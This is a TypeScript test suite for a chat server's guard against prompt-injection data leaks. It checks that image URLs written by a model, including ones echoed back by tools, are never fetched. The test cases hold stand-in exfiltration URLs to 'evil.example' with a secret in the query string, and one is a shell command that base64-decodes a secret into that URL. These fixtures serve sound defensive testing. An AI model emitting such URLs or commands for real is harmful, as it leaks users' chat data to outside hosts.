// Pictures a reply links to are fetched by the server only when the URL came
// from outside a model: a tool's output or the user's own words. A URL a model
// wrote (the way a prompt injection would smuggle chat data out in a query
// string) must never be fetched, even when a tool later echoes it back.
import { describe, expect, it } from 'vitest';
import { cameFromInput, isRemoteImageUrl, remoteImageFor } from '../../src/server/chats/remote-image';

const shot = 'https://is1-ssl.mzstatic.com/image/thumb/x/iphone_1.png/320x480bb.jpg';
const msg = (message: object) => ({ type: 'message', message });

describe('cameFromInput', () => {
  it('accepts a URL first seen in a tool result (the Deck-Man screenshots)', () => {
    const entries = [
      msg({ role: 'user', content: [{ type: 'text', text: '<!--stem:context-->…<!--/stem:context-->\n\nShow me what it looks like.' }] }),
      msg({ role: 'assistant', content: [{ type: 'toolCall', name: 'fetch_content', arguments: { url: 'https://itunes.apple.com/lookup?id=1' } }] }),
      msg({ role: 'toolResult', toolName: 'fetch_content', content: [{ type: 'text', text: `{"screenshotUrls":["${shot}"]}` }] }),
      msg({ role: 'assistant', content: [{ type: 'text', text: `![Deck-Man](${shot})` }] })
    ];
    expect(cameFromInput(entries, shot)).toBe(true);
  });

  it('accepts a URL the user typed, and a stored web-search result', () => {
    expect(cameFromInput([msg({ role: 'user', content: `look: ${shot}` })], shot)).toBe(true);
    expect(cameFromInput([{ type: 'custom', customType: 'web-search-results', data: { urls: [shot] } }], shot)).toBe(true);
  });

  it('refuses a URL a model wrote, even when a tool echoes it afterwards', () => {
    const leak = 'https://evil.example/p.png?q=secret';
    const entries = [
      msg({ role: 'assistant', content: [{ type: 'toolCall', name: 'run_command', arguments: { command: `echo ${leak}` } }] }),
      msg({ role: 'toolResult', toolName: 'run_command', content: [{ type: 'text', text: leak }] }),
      msg({ role: 'assistant', content: [{ type: 'text', text: `![x](${leak})` }] })
    ];
    expect(cameFromInput(entries, leak)).toBe(false);
    expect(cameFromInput([entries[2]], leak)).toBe(false);
  });

  it('refuses URLs from another model: sub-agents, past chats, and memory in the context block', () => {
    for (const toolName of ['spawn_agent', 'coding_agent', 'read_past_chat']) {
      expect(cameFromInput([msg({ role: 'toolResult', toolName, content: [{ type: 'text', text: shot }] })], shot), toolName).toBe(false);
    }
    const contextOnly = msg({ role: 'user', content: `<!--stem:context-->summary ${shot}<!--/stem:context-->\n\nhi` });
    expect(cameFromInput([contextOnly], shot)).toBe(false);
  });

  it('refuses a URL a computing tool assembled, though the model never wrote it whole', () => {
    const leak = 'https://evil.example/p.png?q=secret';
    const entries = [
      msg({ role: 'assistant', content: [{ type: 'toolCall', name: 'run_command', arguments: { command: 'echo https://evil.example/p.png?q=$(echo c2VjcmV0 | base64 -d)' } }] }),
      msg({ role: 'toolResult', toolName: 'run_command', content: [{ type: 'text', text: leak }] })
    ];
    expect(cameFromInput(entries, leak)).toBe(false);
  });

  it('compares whole URLs: a prefix of a URL a page offered is not that URL', () => {
    const long = 'https://cdn.example.com/img/abcdefghij.png';
    const page = msg({ role: 'toolResult', toolName: 'fetch_content', content: [{ type: 'text', text: `see ${long}.` }] });
    expect(cameFromInput([page], long)).toBe(true);
    expect(cameFromInput([page], 'https://cdn.example.com/img/abcde')).toBe(false);
  });

  it('accepts the forms a page writes a picture in: scheme-relative, and with a tracker query (the James Bond chat)', () => {
    const shown = 'https://thumb.wikimedia.org/wikipedia/commons/thumb/0/09/Callum_Turner_%28cropped%29.jpg/250px-Callum_Turner_%28cropped%29.jpg';
    const offered = `${shown.slice('https:'.length)}?utm_source=en.wikipedia.org&utm_campaign=parser`;
    const page = msg({ role: 'toolResult', toolName: 'fetch_content', content: [{ type: 'text', text: `[![](${offered})](https://en.wikipedia.org/wiki/File:x.jpg)` }] });
    expect(cameFromInput([page], shown)).toBe(true);
    expect(cameFromInput([page], `https:${offered}`)).toBe(true);
    // Still whole: a shorter path, or part of the query, is not offered.
    expect(cameFromInput([page], shown.slice(0, -4))).toBe(false);
    expect(cameFromInput([page], `${shown}?utm_source=en.wikipedia.org`)).toBe(false);
    // A computing tool gets no such allowance.
    const shell = msg({ role: 'toolResult', toolName: 'run_command', content: [{ type: 'text', text: offered }] });
    expect(cameFromInput([shell], shown)).toBe(false);
  });

  it('refuses a scheme-relative URL a model wrote first, though a web tool echoes it back', () => {
    const leak = 'https://evil.example/p.png?q=secret';
    const entries = [
      msg({ role: 'assistant', content: [{ type: 'toolCall', name: 'web_search', arguments: { query: '//evil.example/p.png?q=secret' } }] }),
      msg({ role: 'toolResult', toolName: 'web_search', content: [{ type: 'text', text: 'No results for //evil.example/p.png?q=secret' }] })
    ];
    expect(cameFromInput(entries, leak)).toBe(false);
  });

  it('reads bare messages too (a live worker before the session file exists)', () => {
    expect(cameFromInput([{ role: 'toolResult', toolName: 'fetch_content', content: [{ type: 'text', text: shot }] }], shot)).toBe(true);
  });
});

describe('remoteImageFor', () => {
  it('only asks about public https URLs', () => {
    expect(isRemoteImageUrl(shot)).toBe(true);
    for (const bad of ['http://example.com/a.png', 'https://localhost/a.png', 'https://192.168.1.1/a.png', 'https://u:p@example.com/a.png', 'nope']) {
      expect(isRemoteImageUrl(bad), bad).toBe(false);
    }
  });

  it('never fetches a URL the thread did not get from input', async () => {
    let asked = 0;
    const result = await remoteImageFor('t1', 'https://evil.example/p.png?q=secret', async () => {
      asked += 1;
      return false;
    });
    expect(result).toBeNull();
    expect(asked).toBe(1);
  });

  it('fetches at most 24 distinct pictures per chat', async () => {
    const fetched: string[] = [];
    const fetchImage = async (u: string) => {
      fetched.push(u);
      return 'data:image/png;base64,AA==';
    };
    for (let i = 0; i < 30; i++) {
      await remoteImageFor('cap', `https://cdn.example.com/${i}.png`, async () => true, fetchImage);
    }
    expect(fetched.length).toBe(24);
    // One it already vetted still loads (a chat reopened).
    expect(await remoteImageFor('cap', 'https://cdn.example.com/0.png', async () => true, fetchImage)).not.toBeNull();
  });
});
